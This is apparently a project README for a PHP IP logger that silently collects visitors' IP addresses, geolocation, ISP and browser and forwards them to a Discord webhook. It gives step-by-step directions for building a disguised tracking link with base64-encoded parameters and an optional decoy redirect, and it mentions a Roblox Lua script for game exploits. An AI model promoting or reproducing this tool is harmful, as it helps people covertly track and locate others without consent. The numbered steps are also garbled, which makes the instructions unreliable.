# Webhook-IP-Logger
This is a PHP IP logger I made that sends the IP's to a Discord webhook.  
![Showcase with bot filtering turned off](https://vgy.me/MiiQN2.png)
# Features
- Grabs the IP then gets info about it after that it sends it to a webhook you have entered.  
- Gets Geo Location & ISP aswell as the browser  
- Filters out bots  
- ROBLOX Lua script for it (for exploits that have HttpGet or ROBLOX Studio)  
- My site has a script incase you don't have a site  
# How to use without a website
Step 1: Go into the settings of your Discord server, click webhooks and create one then copy the link to it.  
Step 3: Remove https://discordapp.com/api/webhooks/  
Step 3: Encode it in Base64  
Step 5: Add it to the end of https://littest.site/yeet/site.php?h=  
Step 6: [Optional] If you want to redirect to a site add &r= then a website(make sure to encode it in base64)  
**[Example]**  
https://littest.site/yeet/site.php?h=aG9vaw==&r=aHR0cHM6Ly9saXR0ZXN0LnNpdGU=  
**[Base64 Encoding]**  
I would reccomend using this site. https://www.base64encode.org/
